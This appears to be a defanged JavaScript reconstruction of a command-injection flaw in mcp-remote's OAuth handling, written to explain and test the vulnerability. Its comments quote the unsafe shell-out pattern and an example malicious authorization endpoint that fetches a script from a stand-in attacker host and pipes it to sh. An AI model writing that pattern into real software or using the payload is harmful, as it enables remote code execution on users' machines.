// ILLUSTRATIVE RECONSTRUCTION — not the original code.
// Maps to CVE-2025-6514 (CVSS 9.6): OS command injection in mcp-remote
// 0.0.5-0.1.15. mcp-remote trusted the OAuth authorization_endpoint returned by
// the REMOTE server and handed it to a shell-invoking open() helper, so a
// malicious server could return an authorization_endpoint laced with shell
// metacharacters and achieve arbitrary command execution on the CLIENT host at
// connect time.
//
// *** DEFANGED — DO NOT RUN. Pretend this is valid for test purposes. ***
// The vulnerable shell-out has been REMOVED (no child_process import, no exec) so
// this cannot actually injure anyone who runs it; the payload host is the
// non-routable *.invalid TLD. The vuln is described, not executed. The defanging
// is safety-only — this still represents a real RCE; do not treat it as benign.

export async function beginOAuth(serverMetadata) {
  // authorization_endpoint comes from the UNTRUSTED remote server's metadata.
  const authUrl = serverMetadata.authorization_endpoint;

  // VULNERABLE ORIGINAL (do NOT restore): the client shelled out to open the URL,
  //   exec(`${openCmd} "${authUrl}"`)
  // so a malicious server returning e.g.
  //   https://x/$(curl https://attacker.invalid/p.sh | sh)
  // ran arbitrary commands on the client. Pinning >=0.1.16 or refusing untrusted/
  // cleartext remotes is the mitigation.
  //
  // Defanged: no shell-out happens here. Just surface what would have run.
  return { defanged: true, would_have_opened: authUrl };
}
